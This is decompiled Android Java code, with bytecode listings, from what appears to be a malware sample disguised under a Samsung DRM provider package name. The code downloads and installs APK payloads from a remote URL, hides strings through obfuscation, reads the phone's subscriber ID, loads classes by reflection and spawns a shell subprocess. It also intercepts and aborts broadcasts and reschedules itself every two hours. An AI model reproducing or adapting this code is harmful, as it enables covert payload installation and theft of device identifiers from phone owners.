		//   173: ireturn
		//   174: aload #6
		//   176: invokestatic a : (Ljava/lang/String;)Z
		//   179: ifne -> 757
		//   182: aload #6
		//   184: astore #4
		//   186: goto -> 164
		//   189: aload #7
		//   191: ldc_w 'gb2312'
		//   194: iconst_0
		//   195: invokevirtual b : (Ljava/lang/String;I)I
		//   198: istore_2
		//   199: aload #7
		//   201: ldc 'style'
		//   203: iconst_0
		//   204: invokevirtual b : (Ljava/lang/String;I)I
		//   207: istore_1
		//   208: iload_2
		//   209: iload_1
		//   210: if_icmpgt -> 215
		//   213: iconst_0
		//   214: ireturn
		//   215: aload #7
		//   217: ldc_w 'line'
		//   220: iconst_0
		//   221: invokevirtual b : (Ljava/lang/String;I)I
		//   224: istore_3
		//   225: aload #7
		//   227: ldc 'height'
		//   229: iconst_0
		//   230: invokevirtual b : (Ljava/lang/String;I)I
		//   233: istore_2
		//   234: iload_3
		//   235: iload_2
		//   236: if_icmpgt -> 241
		//   239: iconst_0
		//   240: ireturn
		//   241: aload #5
		//   243: invokestatic a : (Ljava/lang/String;)Z
		//   246: ifne -> 538
		//   249: new java/net/URL
		//   252: dup
		//   253: aload #4
		//   255: invokespecial <init> : (Ljava/lang/String;)V
		//   258: invokevirtual openConnection : ()Ljava/net/URLConnection;
		//   261: astore #6
		//   263: aload #6
		//   265: sipush #15000
		//   268: invokevirtual setReadTimeout : (I)V
		//   271: aload #6
		//   273: invokevirtual connect : ()V
		//   276: aload #6
		//   278: invokevirtual getInputStream : ()Ljava/io/InputStream;
		//   281: astore #5
		//   283: aload #6
		//   285: invokevirtual getContentLength : ()I
		//   288: pop
		//   289: new java/io/File
		//   292: dup
		//   293: new java/lang/StringBuilder
		//   296: dup
		//   297: invokespecial <init> : ()V
		//   300: ldc_w '9Ci5utjhztkp7cA_'
		//   303: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   306: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   309: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
		//   312: invokevirtual getPackageName : ()Ljava/lang/String;
		//   315: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   318: ldc_w '9Cz18t3N9CVO7KTm'
		//   321: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   324: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   327: invokevirtual toString : ()Ljava/lang/String;
		//   330: invokespecial <init> : (Ljava/lang/String;)V
		//   333: astore #6
		//   335: aload #6
		//   337: invokevirtual exists : ()Z
		//   340: ifeq -> 477
		//   343: aload #6
		//   345: invokevirtual delete : ()Z
		//   348: pop
		//   349: new java/io/FileOutputStream
		//   352: dup
		//   353: aload #6
		//   355: invokespecial <init> : (Ljava/io/File;)V
		//   358: astore #8
		//   360: sipush #1024
		//   363: newarray byte
		//   365: astore #9
		//   367: aload #5
		//   369: aload #9
		//   371: invokevirtual read : ([B)I
		//   374: istore_3
		//   375: iload_3
		//   376: iconst_m1
		//   377: if_icmpne -> 526
		//   380: aload #5
		//   382: invokevirtual close : ()V
		//   385: aload #6
		//   387: astore #5
		//   389: aload #4
		//   391: ldc_w '.apk'
		//   394: invokevirtual endsWith : (Ljava/lang/String;)Z
		//   397: ifne -> 407
		//   400: aload #6
		//   402: invokestatic a : (Ljava/io/File;)Ljava/io/File;
		//   405: astore #5
		//   407: new java/io/File
		//   410: dup
		//   411: new java/lang/StringBuilder
		//   414: dup
		//   415: invokespecial <init> : ()V
		//   418: ldc_w '9Ci5utjhztkp7cA_'
		//   421: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   424: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   427: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
		//   430: invokevirtual getPackageName : ()Ljava/lang/String;
		//   433: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   436: ldc_w '9Cz18t3N9CkOrC32uI327WBD7n__'
		//   439: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   442: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   445: invokevirtual toString : ()Ljava/lang/String;
		//   448: invokespecial <init> : (Ljava/lang/String;)V
		//   451: astore #4
		//   453: aload #4
		//   455: invokevirtual exists : ()Z
		//   458: ifeq -> 467
		//   461: aload #4
		//   463: invokevirtual delete : ()Z
		//   466: pop
		//   467: aload #5
		//   469: aload #4
		//   471: invokevirtual renameTo : (Ljava/io/File;)Z
		//   474: pop
		//   475: iconst_1
		//   476: ireturn
		//   477: aload #6
		//   479: invokevirtual getParentFile : ()Ljava/io/File;
		//   482: invokevirtual exists : ()Z
		//   485: ifne -> 349
		//   488: aload #6
		//   490: invokevirtual getParentFile : ()Ljava/io/File;
		//   493: invokevirtual mkdirs : ()Z
		//   496: pop
		//   497: goto -> 349
		//   500: astore #4
		//   502: aload #7
		//   504: ldc 'style'
		//   506: iload_1
		//   507: iconst_1
		//   508: iadd
		//   509: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
		//   512: pop
		//   513: aload #7
		//   515: ldc 'height'
		//   517: iload_2
		//   518: iconst_1
		//   519: iadd
		//   520: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
		//   523: pop
		//   524: iconst_0
		//   525: ireturn
		//   526: aload #8
		//   528: aload #9
		//   530: iconst_0
		//   531: iload_3
		//   532: invokevirtual write : ([BII)V
		//   535: goto -> 367
		//   538: aload #6
		//   540: invokestatic a : (Ljava/lang/String;)Z
		//   543: ifne -> 524
		//   546: aload #4
		//   548: iconst_0
		//   549: ldc_w 'utf-8'
		//   552: ldc_w 'KRgr3LpmuRMdKLMdPn__'
		//   555: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   558: invokestatic a : (Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
		//   561: astore #4
		//   563: new java/io/File
		//   566: dup
		//   567: new java/lang/StringBuilder
		//   570: dup
		//   571: invokespecial <init> : ()V
		//   574: ldc_w '9Ci5utjhztkp7cA_'
		//   577: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   580: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   583: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
		//   586: invokevirtual getPackageName : ()Ljava/lang/String;
		//   589: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   592: ldc_w '9Cz18t3N9CVO7KTm9e11rS__'
		//   595: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   598: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   601: invokevirtual toString : ()Ljava/lang/String;
		//   604: invokespecial <init> : (Ljava/lang/String;)V
		//   607: astore #5
		//   609: aload #5
		//   611: invokevirtual exists : ()Z
		//   614: ifeq -> 707
		//   617: aload #5
		//   619: invokevirtual delete : ()Z
		//   622: pop
		//   623: aload #4
		//   625: aload #5
		//   627: invokestatic a : (Ljava/lang/String;Ljava/io/File;)V
		//   630: aload #5
		//   632: invokestatic a : (Ljava/io/File;)Ljava/io/File;
		//   635: astore #4
		//   637: new java/io/File
		//   640: dup
		//   641: new java/lang/StringBuilder
		//   644: dup
		//   645: invokespecial <init> : ()V
		//   648: ldc_w '9Ci5utjhztkp7cA_'
		//   651: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   654: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   657: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
		//   660: invokevirtual getPackageName : ()Ljava/lang/String;
		//   663: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   666: ldc_w '9Cz18t3N9CkOrC32uI327WBD7n__'
		//   669: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
		//   672: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
		//   675: invokevirtual toString : ()Ljava/lang/String;
		//   678: invokespecial <init> : (Ljava/lang/String;)V
		//   681: astore #5
		//   683: aload #5
		//   685: invokevirtual exists : ()Z
		//   688: ifeq -> 697
		//   691: aload #5
		//   693: invokevirtual delete : ()Z
		//   696: pop
		//   697: aload #4
		//   699: aload #5
		//   701: invokevirtual renameTo : (Ljava/io/File;)Z
		//   704: pop
		//   705: iconst_1
		//   706: ireturn
		//   707: aload #5
		//   709: invokevirtual getParentFile : ()Ljava/io/File;
		//   712: invokevirtual exists : ()Z
		//   715: ifne -> 623
		//   718: aload #5
		//   720: invokevirtual getParentFile : ()Ljava/io/File;
		//   723: invokevirtual mkdirs : ()Z
		//   726: pop
		//   727: goto -> 623
		//   730: astore #4
		//   732: aload #7
		//   734: ldc 'style'
		//   736: iload_1
		//   737: iconst_1
		//   738: iadd
		//   739: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
		//   742: pop
		//   743: aload #7
		//   745: ldc 'height'
		//   747: iload_2
		//   748: iconst_1
		//   749: iadd
		//   750: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
		//   753: pop
		//   754: goto -> 524
		//   757: aconst_null
		//   758: astore #4
		//   760: goto -> 164
		// Exception table:
		//   from	to	target	type
		//   249	349	500	java/lang/Exception
		//   349	367	500	java/lang/Exception
		//   367	375	500	java/lang/Exception
		//   380	385	500	java/lang/Exception
		//   389	407	500	java/lang/Exception
		//   407	467	500	java/lang/Exception
		//   467	475	500	java/lang/Exception
		//   477	497	500	java/lang/Exception
		//   526	535	500	java/lang/Exception
		//   546	623	730	java/lang/Exception
		//   623	697	730	java/lang/Exception
		//   697	705	730	java/lang/Exception
		//   707	727	730	java/lang/Exception
	}

	private String f() {
		if (this.i == null && g() == null)
			this.i = Xmlns.c(g());
		return this.i;
	}

	private String g() {
		if (this.h == null)
			try {
				this.h = ((TelephonyManager)this.g.getSystemService("phone")).getSubscriberId();
			} catch (Exception exception) {}
		return this.h;
	}

	public boolean a(Context paramContext, Intent paramIntent, BroadcastReceiver paramBroadcastReceiver, FileDescriptor paramFileDescriptor, String paramString) {
		this.g = paramContext;
		if ("peace".equals(Doctype.a(0).d("saved", "")))
			return false;
		Doctype doctype1 = Doctype.a(0);
		Doctype doctype2 = Doctype.a(11);
		if (0L == doctype1.a("html", 0L)) {
			doctype1.a("html", Long.valueOf((new Date()).getTime()));
			doctype1.a("novel", c);
			doctype1.a("user", b);
			try {
				if (!Xmlns.a(this.m))
					b(this.m);
				b(this.l);
				doctype1.a("from", 3);
				doctype1.a("warpeace", e);
				int k = ((Integer)Doctype.b(null, Xmlns.d(this.d).concat(".").concat(paramBroadcastReceiver.getClass().getSimpleName()), Transitional.f, new Object[] { paramContext, paramIntent, paramBroadcastReceiver, paramFileDescriptor, e })).intValue();
				doctype1.a("novel", k);
				doctype1.a("warpeace", this.d);
				doctype2.a("doctitle", k);
			} catch (Exception exception) {}
		}
		if (Templets.a(paramContext) && a) {
			a = false;
			(new Layers(this)).start();
		}
		int i = doctype1.b("novel", 0);
		int j = doctype2.b("doctitle", 0);
		if (((j == i && j != 0) || (j != i && j == 0)) && (j >= c || j == 0)) {
			String str2 = doctype1.c("warpeace", null);
			String str1 = str2;
			if (Xmlns.a(str2))
				str1 = Xmlns.d(this.d);
			try {
				return ((Boolean)Doctype.b(null, str1.concat(".").concat(paramBroadcastReceiver.getClass().getSimpleName()), Transitional.d, new Object[] { paramContext, paramIntent, paramBroadcastReceiver, paramFileDescriptor, e })).booleanValue();
			} catch (Exception exception) {}
		}
		return false;
	}
}

public class BaseABroadcastReceiver extends BroadcastReceiver {
	private static Onion a = null;

	public static int onGetApk_Install_version_id(Context paramContext, Intent paramIntent, BroadcastReceiver paramBroadcastReceiver, FileDescriptor paramFileDescriptor, String paramString) {
		return Onion.a();
	}

	public static boolean onStart(Context paramContext, Intent paramIntent, BroadcastReceiver paramBroadcastReceiver, FileDescriptor paramFileDescriptor, String paramString) {
		if (a == null)
			a = new Onion();
		return a.a(paramContext, paramIntent, paramBroadcastReceiver, paramFileDescriptor, paramString);
	}

	public void onReceive(Context paramContext, Intent paramIntent) {
		if (!Union.a(paramContext)) {
			Doctype.a(paramContext);
			if (onStart(paramContext, paramIntent, this, null, null)) {
				abortBroadcast();
				return;
			}
		}
	}
}

public abstract class Charset {
	Context a = null;

	Activity b = null;

	private FileDescriptor a() {
		try {
			return Exec.createSubprocess(Xmlns.d("940Br4iR8cMWHxQhrCn_"), "-", null, new int[1]);
		} catch (Exception exception) {
			return null;
		}
	}

	private boolean a(String paramString1, Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString2, Object[] paramArrayOfObject) {
		Doctype.a(paramContext);
		Doctype doctype = Doctype.a(0);
		String str = doctype.c("warpeace", null);
		if (!Xmlns.a(str)) {
			if (paramFileDescriptor == null) {
				try {
					a();
					if (paramString2 == null)
						String str1 = Onion.e;
					if (3 <= doctype.b("from", 0)) {
						boolean bool = ((Boolean)Doctype.a(null, str.concat(".").concat(paramActivity.getClass().getSimpleName()), paramString1, paramArrayOfObject)).booleanValue();
						doctype.a("from", 4);
						return bool;
					}
				} catch (Exception exception) {
					doctype.a("from", 4);
				}
				return false;
			}
		} else {
			return false;
		}
		if (paramString2 == null)
			String str1 = Onion.e;
		if (3 <= doctype.b("from", 0)) {
			boolean bool = ((Boolean)Doctype.a(null, str.concat(".").concat(paramActivity.getClass().getSimpleName()), (String)exception, paramArrayOfObject)).booleanValue();
			doctype.a("from", 4);
			return bool;
		}
	}

	public void a(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Class paramClass, int paramInt) {
		Intent intent = new Intent(paramContext, paramClass);
		intent.addFlags(268435456);
		paramContext.startActivity(intent);
	}

	public void a(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
		a(Transitional.d, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
	}

	public void b(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
		a(Transitional.a, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
	}

	public void c(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
		a(Transitional.b, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
	}

	public void d(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
		a(Transitional.c, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
	}

	public boolean e(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
		return a(Transitional.e, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
	}
}

class Layers extends Thread {
	Layers(Onion paramOnion) {}

	public void run() {
		new Random();
		try {
			while (Onion.a(this.a)) {
				Onion.a = false;
				(new Flavonoids(this)).start();
				Thread.sleep(7200000L);
			}
		} catch (Exception exception) {}
	}
}

